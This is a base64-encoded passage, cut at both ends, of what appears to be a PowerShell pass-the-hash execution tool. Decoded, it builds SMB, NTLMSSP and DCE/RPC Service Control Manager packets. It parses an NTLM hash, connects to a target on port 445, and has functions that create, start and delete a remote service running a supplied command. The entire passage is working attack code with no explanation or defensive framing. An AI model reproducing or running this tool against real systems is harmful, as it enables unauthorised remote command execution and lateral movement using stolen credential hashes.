HBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9NZXNzYWdlVHlwZSIsW0J5dGVbXV0oMHgwMSwweDAwLDB4MDAsMHgwMCkpDQogICAgICAgICRwYWNrZXRfUlBDQmluZC5BZGQoIlJQQ0JpbmRfTmVnb3RpYXRlRmxhZ3MiLFtCeXRlW11dKDB4OTcsMHg4MiwweDA4LDB4ZTIpKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX0NhbGxpbmdXb3Jrc3RhdGlvbkRvbWFpbiIsW0J5dGVbXV0oMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAgICAgJHBhY2tldF9SUENCaW5kLkFkZCgiUlBDQmluZF9DYWxsaW5nV29ya3N0YXRpb25OYW1lIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICAgICAkcGFja2V0X1JQQ0JpbmQuQWRkKCJSUENCaW5kX09TVmVyc2lvbiIsW0J5dGVbXV0oMHgwNiwweDAxLDB4YjEsMHgxZCwweDAwLDB4MDAsMHgwMCwweDBmKSkNCiAgICB9DQoNCiAgICByZXR1cm4gJHBhY2tldF9SUENCaW5kDQp9DQoNCmZ1bmN0aW9uIEdldC1QYWNrZXRSUENSZXF1ZXN0KCkNCnsNCiAgICBwYXJhbShbQnl0ZVtdXSRwYWNrZXRfZmxhZ3MsW0ludF0kcGFja2V0X3NlcnZpY2VfbGVuZ3RoLFtJbnRdJHBhY2tldF9hdXRoX2xlbmd0aCxbSW50XSRwYWNrZXRfYXV0aF9wYWRkaW5nLFtCeXRlW11dJHBhY2tldF9jYWxsX0lELFtCeXRlW11dJHBhY2tldF9jb250ZXh0X0lELFtCeXRlW11dJHBhY2tldF9vcG51bSxbQnl0ZVtdXSRwYWNrZXRfb2JqZWN0X1VVSUQpDQoNCiAgICBpZigkcGFja2V0X2F1dGhfbGVuZ3RoIC1ndCAwKQ0KICAgIHsNCiAgICAgICAgJHBhY2tldF9mdWxsX2F1dGhfbGVuZ3RoID0gJHBhY2tldF9hdXRoX2xlbmd0aCArICRwYWNrZXRfYXV0aF9wYWRkaW5nICsgOA0KICAgIH0NCg0KICAgIFtCeXRlW11dJHBhY2tldF93cml0ZV9sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRwYWNrZXRfc2VydmljZV9sZW5ndGggKyAyNCArICRwYWNrZXRfZnVsbF9hdXRoX2xlbmd0aCArICRwYWNrZXRfb2JqZWN0X1VVSUQuTGVuZ3RoKQ0KICAgIFtCeXRlW11dJHBhY2tldF9mcmFnX2xlbmd0aCA9ICRwYWNrZXRfd3JpdGVfbGVuZ3RoWzAsMV0NCiAgICBbQnl0ZVtdXSRwYWNrZXRfYWxsb2NfaGludCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJHBhY2tldF9zZXJ2aWNlX2xlbmd0aCkNCiAgICBbQnl0ZVtdXSRwYWNrZXRfYXV0aF9sZW5ndGggPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OkdldEJ5dGVzKCRwYWNrZXRfYXV0aF9sZW5ndGgpDQogICAgJHBhY2tldF9hdXRoX2xlbmd0aCA9ICRwYWNrZXRfYXV0aF9sZW5ndGhbMCwxXQ0KDQogICAgJHBhY2tldF9SUENSZXF1ZXN0ID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkNCiAgICAkcGFja2V0X1JQQ1JlcXVlc3QuQWRkKCJSUENSZXF1ZXN0X1ZlcnNpb24iLFtCeXRlW11dKDB4MDUpKQ0KICAgICRwYWNrZXRfUlBDUmVxdWVzdC5BZGQoIlJQQ1JlcXVlc3RfVmVyc2lvbk1pbm9yIixbQnl0ZVtdXSgweDAwKSkNCiAgICAkcGFja2V0X1JQQ1JlcXVlc3QuQWRkKCJSUENSZXF1ZXN0X1BhY2tldFR5cGUiLFtCeXRlW11dKDB4MDApKQ0KICAgICRwYWNrZXRfUlBDUmVxdWVzdC5BZGQoIlJQQ1JlcXVlc3RfUGFja2V0RmxhZ3MiLCRwYWNrZXRfZmxhZ3MpDQogICAgJHBhY2tldF9SUENSZXF1ZXN0LkFkZCgiUlBDUmVxdWVzdF9EYXRhUmVwcmVzZW50YXRpb24iLFtCeXRlW11dKDB4MTAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfUlBDUmVxdWVzdC5BZGQoIlJQQ1JlcXVlc3RfRnJhZ0xlbmd0aCIsJHBhY2tldF9mcmFnX2xlbmd0aCkNCiAgICAkcGFja2V0X1JQQ1JlcXVlc3QuQWRkKCJSUENSZXF1ZXN0X0F1dGhMZW5ndGgiLCRwYWNrZXRfYXV0aF9sZW5ndGgpDQogICAgJHBhY2tldF9SUENSZXF1ZXN0LkFkZCgiUlBDUmVxdWVzdF9DYWxsSUQiLCRwYWNrZXRfY2FsbF9JRCkNCiAgICAkcGFja2V0X1JQQ1JlcXVlc3QuQWRkKCJSUENSZXF1ZXN0X0FsbG9jSGludCIsJHBhY2tldF9hbGxvY19oaW50KQ0KICAgICRwYWNrZXRfUlBDUmVxdWVzdC5BZGQoIlJQQ1JlcXVlc3RfQ29udGV4dElEIiwkcGFja2V0X2NvbnRleHRfSUQpDQogICAgJHBhY2tldF9SUENSZXF1ZXN0LkFkZCgiUlBDUmVxdWVzdF9PcG51bSIsJHBhY2tldF9vcG51bSkNCg0KICAgIGlmKCRwYWNrZXRfb2JqZWN0X1VVSUQuTGVuZ3RoKQ0KICAgIHsNCiAgICAgICAgJHBhY2tldF9SUENSZXF1ZXN0LkFkZCgiUlBDUmVxdWVzdF9PYmplY3RVVUlEIiwkcGFja2V0X29iamVjdF9VVUlEKQ0KICAgIH0NCg0KICAgIHJldHVybiAkcGFja2V0X1JQQ1JlcXVlc3QNCn0NCg0KI1NDTQ0KDQpmdW5jdGlvbiBHZXQtUGFja2V0U0NNT3BlblNDTWFuYWdlclcoKQ0Kew0KICAgIHBhcmFtIChbQnl0ZVtdXSRwYWNrZXRfc2VydmljZSxbQnl0ZVtdXSRwYWNrZXRfc2VydmljZV9sZW5ndGgpDQoNCiAgICBbQnl0ZVtdXSRwYWNrZXRfd3JpdGVfbGVuZ3RoID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X3NlcnZpY2UuTGVuZ3RoICsgOTIpDQogICAgW0J5dGVbXV0kcGFja2V0X2ZyYWdfbGVuZ3RoID0gJHBhY2tldF93cml0ZV9sZW5ndGhbMCwxXQ0KICAgIFtCeXRlW11dJHBhY2tldF9hbGxvY19oaW50ID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkcGFja2V0X3NlcnZpY2UuTGVuZ3RoICsgNjgpDQogICAgJHBhY2tldF9yZWZlcmVudF9JRDEgPSBbU3RyaW5nXSgxLi4yIHwgRm9yRWFjaC1PYmplY3QgeyJ7MDpYMn0iIC1mIChHZXQtUmFuZG9tIC1NaW5pbXVtIDEgLU1heGltdW0gMjU1KX0pDQogICAgJHBhY2tldF9yZWZlcmVudF9JRDEgPSAkcGFja2V0X3JlZmVyZW50X0lEMS5TcGxpdCgiICIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9DQogICAgJHBhY2tldF9yZWZlcmVudF9JRDEgKz0gMHgwMCwweDAwDQogICAgJHBhY2tldF9yZWZlcmVudF9JRDIgPSBbU3RyaW5nXSgxLi4yIHwgRm9yRWFjaC1PYmplY3QgeyJ7MDpYMn0iIC1mIChHZXQtUmFuZG9tIC1NaW5pbXVtIDEgLU1heGltdW0gMjU1KX0pDQogICAgJHBhY2tldF9yZWZlcmVudF9JRDIgPSAkcGFja2V0X3JlZmVyZW50X0lEMi5TcGxpdCgiICIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9DQogICAgJHBhY2tldF9yZWZlcmVudF9JRDIgKz0gMHgwMCwweDAwDQoNCiAgICAkcGFja2V0X1NDTU9wZW5TQ01hbmFnZXJXID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkNCiAgICAkcGFja2V0X1NDTU9wZW5TQ01hbmFnZXJXLkFkZCgiU0NNT3BlblNDTWFuYWdlcldfTWFjaGluZU5hbWVfUmVmZXJlbnRJRCIsJHBhY2tldF9yZWZlcmVudF9JRDEpDQogICAgJHBhY2tldF9TQ01PcGVuU0NNYW5hZ2VyVy5BZGQoIlNDTU9wZW5TQ01hbmFnZXJXX01hY2hpbmVOYW1lX01heENvdW50IiwkcGFja2V0X3NlcnZpY2VfbGVuZ3RoKQ0KICAgICRwYWNrZXRfU0NNT3BlblNDTWFuYWdlclcuQWRkKCJTQ01PcGVuU0NNYW5hZ2VyV19NYWNoaW5lTmFtZV9PZmZzZXQiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU0NNT3BlblNDTWFuYWdlclcuQWRkKCJTQ01PcGVuU0NNYW5hZ2VyV19NYWNoaW5lTmFtZV9BY3R1YWxDb3VudCIsJHBhY2tldF9zZXJ2aWNlX2xlbmd0aCkNCiAgICAkcGFja2V0X1NDTU9wZW5TQ01hbmFnZXJXLkFkZCgiU0NNT3BlblNDTWFuYWdlcldfTWFjaGluZU5hbWUiLCRwYWNrZXRfc2VydmljZSkNCiAgICAkcGFja2V0X1NDTU9wZW5TQ01hbmFnZXJXLkFkZCgiU0NNT3BlblNDTWFuYWdlcldfRGF0YWJhc2VfUmVmZXJlbnRJRCIsJHBhY2tldF9yZWZlcmVudF9JRDIpDQogICAgJHBhY2tldF9TQ01PcGVuU0NNYW5hZ2VyVy5BZGQoIlNDTU9wZW5TQ01hbmFnZXJXX0RhdGFiYXNlX05hbWVNYXhDb3VudCIsW0J5dGVbXV0oMHgwZiwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TQ01PcGVuU0NNYW5hZ2VyVy5BZGQoIlNDTU9wZW5TQ01hbmFnZXJXX0RhdGFiYXNlX05hbWVPZmZzZXQiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU0NNT3BlblNDTWFuYWdlclcuQWRkKCJTQ01PcGVuU0NNYW5hZ2VyV19EYXRhYmFzZV9OYW1lQWN0dWFsQ291bnQiLFtCeXRlW11dKDB4MGYsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU0NNT3BlblNDTWFuYWdlclcuQWRkKCJTQ01PcGVuU0NNYW5hZ2VyV19EYXRhYmFzZSIsW0J5dGVbXV0oMHg1MywweDAwLDB4NjUsMHgwMCwweDcyLDB4MDAsMHg3NiwweDAwLDB4NjksMHgwMCwweDYzLDB4MDAsMHg2NSwweDAwLDB4NzMsMHgwMCwweDQxLDB4MDAsMHg2MywweDAwLDB4NzQsMHgwMCwweDY5LDB4MDAsMHg3NiwweDAwLDB4NjUsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU0NNT3BlblNDTWFuYWdlclcuQWRkKCJTQ01PcGVuU0NNYW5hZ2VyV19Vbmtub3duIixbQnl0ZVtdXSgweGJmLDB4YmYpKQ0KICAgICRwYWNrZXRfU0NNT3BlblNDTWFuYWdlclcuQWRkKCJTQ01PcGVuU0NNYW5hZ2VyV19BY2Nlc3NNYXNrIixbQnl0ZVtdXSgweDNmLDB4MDAsMHgwMCwweDAwKSkNCiAgICANCiAgICByZXR1cm4gJHBhY2tldF9TQ01PcGVuU0NNYW5hZ2VyVw0KfQ0KDQpmdW5jdGlvbiBHZXQtUGFja2V0U0NNQ3JlYXRlU2VydmljZVcoKQ0Kew0KICAgIHBhcmFtKFtCeXRlW11dJHBhY2tldF9jb250ZXh0X2hhbmRsZSxbQnl0ZVtdXSRwYWNrZXRfc2VydmljZSxbQnl0ZVtdXSRwYWNrZXRfc2VydmljZV9sZW5ndGgsDQogICAgICAgICAgICBbQnl0ZVtdXSRwYWNrZXRfY29tbWFuZCxbQnl0ZVtdXSRwYWNrZXRfY29tbWFuZF9sZW5ndGgpDQogICAgICAgICAgICAgICAgDQogICAgJHBhY2tldF9yZWZlcmVudF9JRCA9IFtTdHJpbmddKDEuLjIgfCBGb3JFYWNoLU9iamVjdCB7InswOlgyfSIgLWYgKEdldC1SYW5kb20gLU1pbmltdW0gMSAtTWF4aW11bSAyNTUpfSkNCiAgICAkcGFja2V0X3JlZmVyZW50X0lEID0gJHBhY2tldF9yZWZlcmVudF9JRC5TcGxpdCgiICIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9DQogICAgJHBhY2tldF9yZWZlcmVudF9JRCArPSAweDAwLDB4MDANCg0KICAgICRwYWNrZXRfU0NNQ3JlYXRlU2VydmljZVcgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQ0KICAgICRwYWNrZXRfU0NNQ3JlYXRlU2VydmljZVcuQWRkKCJTQ01DcmVhdGVTZXJ2aWNlV19Db250ZXh0SGFuZGxlIiwkcGFja2V0X2NvbnRleHRfaGFuZGxlKQ0KICAgICRwYWNrZXRfU0NNQ3JlYXRlU2VydmljZVcuQWRkKCJTQ01DcmVhdGVTZXJ2aWNlV19TZXJ2aWNlTmFtZV9NYXhDb3VudCIsJHBhY2tldF9zZXJ2aWNlX2xlbmd0aCkNCiAgICAkcGFja2V0X1NDTUNyZWF0ZVNlcnZpY2VXLkFkZCgiU0NNQ3JlYXRlU2VydmljZVdfU2VydmljZU5hbWVfT2Zmc2V0IixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1NDTUNyZWF0ZVNlcnZpY2VXLkFkZCgiU0NNQ3JlYXRlU2VydmljZVdfU2VydmljZU5hbWVfQWN0dWFsQ291bnQiLCRwYWNrZXRfc2VydmljZV9sZW5ndGgpDQogICAgJHBhY2tldF9TQ01DcmVhdGVTZXJ2aWNlVy5BZGQoIlNDTUNyZWF0ZVNlcnZpY2VXX1NlcnZpY2VOYW1lIiwkcGFja2V0X3NlcnZpY2UpDQogICAgJHBhY2tldF9TQ01DcmVhdGVTZXJ2aWNlVy5BZGQoIlNDTUNyZWF0ZVNlcnZpY2VXX0Rpc3BsYXlOYW1lX1JlZmVyZW50SUQiLCRwYWNrZXRfcmVmZXJlbnRfSUQpDQogICAgJHBhY2tldF9TQ01DcmVhdGVTZXJ2aWNlVy5BZGQoIlNDTUNyZWF0ZVNlcnZpY2VXX0Rpc3BsYXlOYW1lX01heENvdW50IiwkcGFja2V0X3NlcnZpY2VfbGVuZ3RoKQ0KICAgICRwYWNrZXRfU0NNQ3JlYXRlU2VydmljZVcuQWRkKCJTQ01DcmVhdGVTZXJ2aWNlV19EaXNwbGF5TmFtZV9PZmZzZXQiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU0NNQ3JlYXRlU2VydmljZVcuQWRkKCJTQ01DcmVhdGVTZXJ2aWNlV19EaXNwbGF5TmFtZV9BY3R1YWxDb3VudCIsJHBhY2tldF9zZXJ2aWNlX2xlbmd0aCkNCiAgICAkcGFja2V0X1NDTUNyZWF0ZVNlcnZpY2VXLkFkZCgiU0NNQ3JlYXRlU2VydmljZVdfRGlzcGxheU5hbWUiLCRwYWNrZXRfc2VydmljZSkNCiAgICAkcGFja2V0X1NDTUNyZWF0ZVNlcnZpY2VXLkFkZCgiU0NNQ3JlYXRlU2VydmljZVdfQWNjZXNzTWFzayIsW0J5dGVbXV0oMHhmZiwweDAxLDB4MGYsMHgwMCkpDQogICAgJHBhY2tldF9TQ01DcmVhdGVTZXJ2aWNlVy5BZGQoIlNDTUNyZWF0ZVNlcnZpY2VXX1NlcnZpY2VUeXBlIixbQnl0ZVtdXSgweDEwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1NDTUNyZWF0ZVNlcnZpY2VXLkFkZCgiU0NNQ3JlYXRlU2VydmljZVdfU2VydmljZVN0YXJ0VHlwZSIsW0J5dGVbXV0oMHgwMiwweDAwLDB4MDAsMHgwMCkpDQogICAgJHBhY2tldF9TQ01DcmVhdGVTZXJ2aWNlVy5BZGQoIlNDTUNyZWF0ZVNlcnZpY2VXX1NlcnZpY2VFcnJvckNvbnRyb2wiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU0NNQ3JlYXRlU2VydmljZVcuQWRkKCJTQ01DcmVhdGVTZXJ2aWNlV19CaW5hcnlQYXRoTmFtZV9NYXhDb3VudCIsJHBhY2tldF9jb21tYW5kX2xlbmd0aCkNCiAgICAkcGFja2V0X1NDTUNyZWF0ZVNlcnZpY2VXLkFkZCgiU0NNQ3JlYXRlU2VydmljZVdfQmluYXJ5UGF0aE5hbWVfT2Zmc2V0IixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1NDTUNyZWF0ZVNlcnZpY2VXLkFkZCgiU0NNQ3JlYXRlU2VydmljZVdfQmluYXJ5UGF0aE5hbWVfQWN0dWFsQ291bnQiLCRwYWNrZXRfY29tbWFuZF9sZW5ndGgpDQogICAgJHBhY2tldF9TQ01DcmVhdGVTZXJ2aWNlVy5BZGQoIlNDTUNyZWF0ZVNlcnZpY2VXX0JpbmFyeVBhdGhOYW1lIiwkcGFja2V0X2NvbW1hbmQpDQogICAgJHBhY2tldF9TQ01DcmVhdGVTZXJ2aWNlVy5BZGQoIlNDTUNyZWF0ZVNlcnZpY2VXX05VTExQb2ludGVyIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1NDTUNyZWF0ZVNlcnZpY2VXLkFkZCgiU0NNQ3JlYXRlU2VydmljZVdfVGFnSUQiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU0NNQ3JlYXRlU2VydmljZVcuQWRkKCJTQ01DcmVhdGVTZXJ2aWNlV19OVUxMUG9pbnRlcjIiLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDApKQ0KICAgICRwYWNrZXRfU0NNQ3JlYXRlU2VydmljZVcuQWRkKCJTQ01DcmVhdGVTZXJ2aWNlV19EZXBlbmRTaXplIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1NDTUNyZWF0ZVNlcnZpY2VXLkFkZCgiU0NNQ3JlYXRlU2VydmljZVdfTlVMTFBvaW50ZXIzIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1NDTUNyZWF0ZVNlcnZpY2VXLkFkZCgiU0NNQ3JlYXRlU2VydmljZVdfTlVMTFBvaW50ZXI0IixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCiAgICAkcGFja2V0X1NDTUNyZWF0ZVNlcnZpY2VXLkFkZCgiU0NNQ3JlYXRlU2VydmljZVdfUGFzc3dvcmRTaXplIixbQnl0ZVtdXSgweDAwLDB4MDAsMHgwMCwweDAwKSkNCg0KICAgIHJldHVybiAkcGFja2V0X1NDTUNyZWF0ZVNlcnZpY2VXDQp9DQoNCmZ1bmN0aW9uIEdldC1QYWNrZXRTQ01TdGFydFNlcnZpY2VXKCkNCnsNCiAgICBwYXJhbShbQnl0ZVtdXSRwYWNrZXRfY29udGV4dF9oYW5kbGUpDQoNCiAgICAkcGFja2V0X1NDTVN0YXJ0U2VydmljZVcgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5TcGVjaWFsaXplZC5PcmRlcmVkRGljdGlvbmFyeQ0KICAgICRwYWNrZXRfU0NNU3RhcnRTZXJ2aWNlVy5BZGQoIlNDTVN0YXJ0U2VydmljZVdfQ29udGV4dEhhbmRsZSIsJHBhY2tldF9jb250ZXh0X2hhbmRsZSkNCiAgICAkcGFja2V0X1NDTVN0YXJ0U2VydmljZVcuQWRkKCJTQ01TdGFydFNlcnZpY2VXX1Vua25vd24iLFtCeXRlW11dKDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCkpDQoNCiAgICByZXR1cm4gJHBhY2tldF9TQ01TdGFydFNlcnZpY2VXDQp9DQoNCmZ1bmN0aW9uIEdldC1QYWNrZXRTQ01EZWxldGVTZXJ2aWNlVygpDQp7DQogICAgcGFyYW0oW0J5dGVbXV0kcGFja2V0X2NvbnRleHRfaGFuZGxlKQ0KDQogICAgJHBhY2tldF9TQ01EZWxldGVTZXJ2aWNlVyA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkLk9yZGVyZWREaWN0aW9uYXJ5DQogICAgJHBhY2tldF9TQ01EZWxldGVTZXJ2aWNlVy5BZGQoIlNDTURlbGV0ZVNlcnZpY2VXX0NvbnRleHRIYW5kbGUiLCRwYWNrZXRfY29udGV4dF9oYW5kbGUpDQoNCiAgICByZXR1cm4gJHBhY2tldF9TQ01EZWxldGVTZXJ2aWNlVw0KfQ0KDQpmdW5jdGlvbiBHZXQtUGFja2V0U0NNQ2xvc2VTZXJ2aWNlSGFuZGxlKCkNCnsNCiAgICBwYXJhbShbQnl0ZVtdXSRwYWNrZXRfY29udGV4dF9oYW5kbGUpDQoNCiAgICAkcGFja2V0X1NDTV9DbG9zZVNlcnZpY2VXID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQuT3JkZXJlZERpY3Rpb25hcnkNCiAgICAkcGFja2V0X1NDTV9DbG9zZVNlcnZpY2VXLkFkZCgiU0NNQ2xvc2VTZXJ2aWNlV19Db250ZXh0SGFuZGxlIiwkcGFja2V0X2NvbnRleHRfaGFuZGxlKQ0KDQogICAgcmV0dXJuICRwYWNrZXRfU0NNX0Nsb3NlU2VydmljZVcNCn0NCg0KZnVuY3Rpb24gRGF0YUxlbmd0aDINCnsNCiAgICBwYXJhbSAoW0ludF0kbGVuZ3RoX3N0YXJ0LFtCeXRlW11dJHN0cmluZ19leHRyYWN0X2RhdGEpDQoNCiAgICAkc3RyaW5nX2xlbmd0aCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9VSW50MTYoJHN0cmluZ19leHRyYWN0X2RhdGFbJGxlbmd0aF9zdGFydC4uKCRsZW5ndGhfc3RhcnQgKyAxKV0sMCkNCg0KICAgIHJldHVybiAkc3RyaW5nX2xlbmd0aA0KfQ0KDQppZigkaGFzaCAtbGlrZSAiKjoqIikNCnsNCiAgICAkaGFzaCA9ICRoYXNoLlN1YlN0cmluZygoJGhhc2guSW5kZXhPZigiOiIpICsgMSksMzIpDQp9DQoNCmlmKCREb21haW4pDQp7DQogICAgJG91dHB1dF91c2VybmFtZSA9ICREb21haW4gKyAiXCIgKyAkVXNlcm5hbWUNCn0NCmVsc2UNCnsNCiAgICAkb3V0cHV0X3VzZXJuYW1lID0gJFVzZXJuYW1lDQp9DQoNCiRwcm9jZXNzX0lEID0gW1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzXTo6R2V0Q3VycmVudFByb2Nlc3MoKSB8IFNlbGVjdC1PYmplY3QgLWV4cGFuZCBpZA0KJHByb2Nlc3NfSUQgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKFtTeXN0ZW0uQml0Q29udmVydGVyXTo6R2V0Qnl0ZXMoJHByb2Nlc3NfSUQpKQ0KJHByb2Nlc3NfSUQgPSAkcHJvY2Vzc19JRCAtcmVwbGFjZSAiLTAwLTAwIiwiIg0KW0J5dGVbXV0kcHJvY2Vzc19JRF9ieXRlcyA9ICRwcm9jZXNzX0lELlNwbGl0KCItIikgfCBGb3JFYWNoLU9iamVjdHtbQ2hhcl1bU3lzdGVtLkNvbnZlcnRdOjpUb0ludDE2KCRfLDE2KX0NCiRTTUJfY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50DQokU01CX2NsaWVudC5DbGllbnQuUmVjZWl2ZVRpbWVvdXQgPSA2MDAwMA0KDQp0cnkNCnsNCiAgICAkU01CX2NsaWVudC5Db25uZWN0KCRUYXJnZXQsIjQ0NSIpDQp9DQpjYXRjaA0Kew0KICAgIFdyaXRlLU91dHB1dCAiJFRhcmdldCBkaWQgbm90IHJlc3BvbmQiDQp9DQoNCmlmKCRTTUJfY2xpZW50LkNvbm5lY3RlZCkNCnsNCiAgICAkU01CX2NsaWVudF9zdHJlYW0gPSAkU01CX2NsaWVudC5HZXRTdHJlYW0oKQ0KICAgICRTTUJfY2xpZW50X3JlY2VpdmUgPSBOZXctT2JqZWN0IFN5c3RlbS5CeXRlW10gMTAyNA0KICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ05lZ290aWF0ZVNNQicNCg0KICAgIHdoaWxlKCRTTUJfY2xpZW50X3N0YWdlIC1uZSAnZXhpdCcpDQogICAgew0KICAgICAgICANCiAgICAgICAgc3dpdGNoICgkU01CX2NsaWVudF9zdGFnZSkNCiAgICAgICAgew0KDQogICAgICAgICAgICAnTmVnb3RpYXRlU01CJw0KICAgICAgICAgICAgeyAgICAgICAgICANCiAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9oZWFkZXIgPSBHZXQtUGFja2V0U01CSGVhZGVyIDB4NzIgMHgxOCAweDAxLDB4NDggMHhmZiwweGZmICRwcm9jZXNzX0lEX2J5dGVzIDB4MDAsMHgwMCAgICAgICANCiAgICAgICAgICAgICAgICAkcGFja2V0X1NNQl9kYXRhID0gR2V0LVBhY2tldFNNQk5lZ290aWF0ZVByb3RvY29sUmVxdWVzdCAkU01CX3ZlcnNpb24NCiAgICAgICAgICAgICAgICAkU01CX2hlYWRlciA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2hlYWRlcg0KICAgICAgICAgICAgICAgICRTTUJfZGF0YSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfU01CX2RhdGENCiAgICAgICAgICAgICAgICAkcGFja2V0X05ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlID0gR2V0LVBhY2tldE5ldEJJT1NTZXNzaW9uU2VydmljZSAkU01CX2hlYWRlci5MZW5ndGggJFNNQl9kYXRhLkxlbmd0aA0KICAgICAgICAgICAgICAgICROZXRCSU9TX3Nlc3Npb25fc2VydmljZSA9IENvbnZlcnRGcm9tLVBhY2tldE9yZGVyZWREaWN0aW9uYXJ5ICRwYWNrZXRfTmV0QklPU19zZXNzaW9uX3NlcnZpY2UNCiAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zZW5kID0gJE5ldEJJT1Nfc2Vzc2lvbl9zZXJ2aWNlICsgJFNNQl9oZWFkZXIgKyAkU01CX2RhdGENCiAgICAgICAgICAgICAgICAkU01CX2NsaWVudF9zdHJlYW0uV3JpdGUoJFNNQl9jbGllbnRfc2VuZCwwLCRTTUJfY2xpZW50X3NlbmQuTGVuZ3RoKSA+ICRudWxsDQogICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLkZsdXNoKCkgICAgDQogICAgICAgICAgICAgICAgJFNNQl9jbGllbnRfc3RyZWFtLlJlYWQoJFNNQl9jbGllbnRfcmVjZWl2ZSwwLCRTTUJfY2xpZW50X3JlY2VpdmUuTGVuZ3RoKSA+ICRudWxsDQoNCiAgICAgICAgICAgICAgICBpZihbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRTTUJfY2xpZW50X3JlY2VpdmVbNC4uN10pIC1lcSAnZmYtNTMtNGQtNDInKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgJFNNQl92ZXJzaW9uID0gJ1NNQjEnDQogICAgICAgICAgICAgICAgICAgICRTTUJfY2xpZW50X3N0YWdlID0gJ05UTE1TU1BOZWdvdGlhdGUnDQoNCiAgICAgICAgICAgICAgICAgICAgaWYoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkU01CX2NsaWVudF9yZWNlaXZlWzM5XSkgLWVxICcwZicpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlNNQiBzaWduaW5nIGlzIGVuYWJsZWQiDQogICAgICAgICAgICAgICAgICAgICAgICAkU01CX3NpZ25pbmcgPSAkdHJ1ZQ0KICAgICAgICAgICAgICAgICAgICAgICAgJFNNQl9zZXNzaW9uX2tleV9sZW5ndGggPSAweDAwLDB4MDANCiAgICAgICAgICAgICAgICAgICAgICAgICRTTUJfbmVnb3RpYXRlX2ZsYWdzID0gMHgxNSwweDgyLDB4MDgsMHhhMA0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgI